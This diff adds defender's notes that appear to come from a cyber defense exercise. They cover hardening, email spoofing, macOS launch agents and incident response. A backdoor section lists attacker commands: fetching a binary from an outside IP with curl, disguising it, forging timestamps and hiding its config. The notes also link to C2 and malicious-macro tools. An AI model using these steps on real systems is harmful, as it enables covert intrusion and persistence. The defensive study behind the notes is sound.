@@ -1,0 +1,127 @@
+EVERYONE NEEDS TO KNOW:
+-Temp files are suspicious
+-Dscl, plutil, tr to dump password hashes
+-Chrome spawning processes is BAD.
+-SystemTap Linux monitor network connections and processes. Programming – Security and Debugging.
+-Built in tools on linux and unix allow attackers to move laterally, attackers don’t need their own toolset “living off the land”
+-ping -c1 <system>  		single ping
+-dig <host> 			pull up information on servers
+-dns-sd -B <service>		uses bonjour and broadcasts services that are listening
+-delete curl
+-Block pastebin
+-ROOTKITS ON ONE BUILD
+-kill 445 outbound
+-enable filtering of port 445
+-Typos, headers, 
+email domains spf records, certbuild, certpot prevents spoofing
+-embedded links –    it, right click and copy into notepad
+-embedded images –
+-look out for image source attacks – send email with embedded image to call to a c2 server
+-don’t download images automatically, make sure they load but not downloading
+-make sure you have an official contact to verify information
+-Port:4786 - *cisco smart installation DENY all traffic, this is a PNP config/image management featuer for switches*
+-Look for cleartext passwords secret 7
+-Look for remote access – smart installations, upload configuration access 
+-Setup the configuration is a secret 5 instead of a secret 7
+-if you aren’t using powershell, kill it
+-kill macros
+-Sentry on the wall converge 2016 - *the ability to use dumped passwords using sentry tool and downloading config file for the specific target*
+-Silent trinity - *modern, asynchronous, multiplayer & multiserver C2/post-exploitation framework powered by Python 3 and .NETs DLR*
+https://github.com/byt3bl33d3r/SILENTTRINITY
+-man in the middle over ipv6 – disable if you’re not using it
+-prioritize ipv4 over ipv6
+-Proxy configuration set not to accept auto-proxies restrict proxy browsers
+-TALK TO NO ONE ABOUT WHAT YOU ARE DOING BESIDES YOUR TEAM MEMEBERS
+
+BACKDOOR:
+curl -O hxxp://61.78.62.21:8080/Tssd	- like wget, lets them pull packages
+chmod +x Tssd				
+mv /var/tmp/Tssd rutil			masks file to make it look legit as r2util
+touch -r r2util rutil			take timestamps from r2util and apply to rutil. Anti-forensics
+ls -la /usr/local/bin/rutil			makes sure it’s there and working
+vim /etc/.cache				config file IP address, port to report on, authentication key
+chmod 400 .cache			makes it less likely to stumble on. Hidden file in /etc/		
+tinyshell open source backdoor – works like ssh
+https://github.com/creaktive/tsh
+https://casper.ssl.berkeley.edu/wiki/TinySHell
+
+
+
+process group ID (PGID):
+#When a process is forked, it inherits its PGID from its parent. 
+#The PGID changes when a process becomes a process group leader, then its PGID is copied from its PID
+kill -- -N *kills all the processes in the group with PGID = N*
+
+MAC OSX:
+-Launchd > sshd > bash > 
+-sw_vers system_profiler 
+-dscl . -list /Users		dump user commands, similar to dumping /etc/passwd
+
+Launch daemons and launch agents: 
+#https://www.makeuseof.com/tag/hidden-launchdaemons-launchagents-mac/
+#Open the AppleScript Editor app by searching for it in Spotlight. 
+#Click Preferences and choose General > Show Script menu in menu bar.
+#Click the Script Menu icon and choose Folder Actions > Enable Folder Actions. 
+#Then select Attach Script to Folder in that same menu.
+#A dialog box will pop up. From here, select add – new item alert.
+#Click OK to open a Finder window. Now select the user LaunchDaemon folder (listed above) and click Choose.
+#When done, open Finder and click Go > Go to Folder or press Shift + Cmd + G to open the navigation dialog box. 
+#Type ~/Library/LaunchAgents and click Go.
+#Right-click the LaunchAgents folder, and choose Services > Folder Actions Setup to bind the new item alert script to each folder.
+#In the dialog box that pops up, you’ll see the list of folders in the left column and script in the right column. 
+#If you don’t see any scripts, click the Plus button and add new item alert.scpt.
+
+#System Integrity Protection Level
+/System/Library/LaunchDaemons
+/System/Library/LaunchAgents
+
+#Root Level
+/Library/LaunchDaemons
+/Library/LaunchAgents
+
+#User Level
+/Users/$USER/Library/LaunchDaemons
+/Users/$USER/Library/LaunchAgents
+
+#Look at startup scripts
+
+SSH:
+#check ssh known hosts
+ssh -o UserKnownHostsFile=/dev/null
+#grabs any use of ssh in bash history
+grep ssh .bash_history		
+
+PTY TTY:
+#Runs a base64 encoder in python to enter something stealthy into bash. PTY device type file to give interaction with a file you’re working with. 
+#If a shell is open and is fully interactive, there should be a PTY file.
+#Find the directory and how to tie it to a process.
+
+Github @jbradley89
+Incident Response OSX Scripting and Analysis 
+https://github.com/jbradley89/osx_incident_response_scripting_and_analysis
+
+
+
+ALL WINDOWS:
+wmi msbuild
+https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator/blob/master/configs/wmi-msbuild-evasion-domain.json
+malicious macros
+https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
+
+WEBMAIL:
+#update exchange servers
+#api abuse against an exchange (foxit)
+https://www.cvedetails.com/vulnerability-list/vendor_id-7654/product_id-16993/Foxitsoftware-Foxit-Reader.html
+#setup authentication for email - use SASL
+http://www.postfix.org/SASL_README.html
+http://www.postfix.org/SASL_README.html#server_sasl
+
+
+SPLUNK - WHAT TO WATCH FOR:
+lanmon I want an alert of non-authorized devices
+Watch what is traversing networks
+
+PHYSICAL ISSUES:
+onity lock vulnerability (doors)
+make sure you monitor who comes and goes from your room, obscure whiteboards
+check for drones outside room
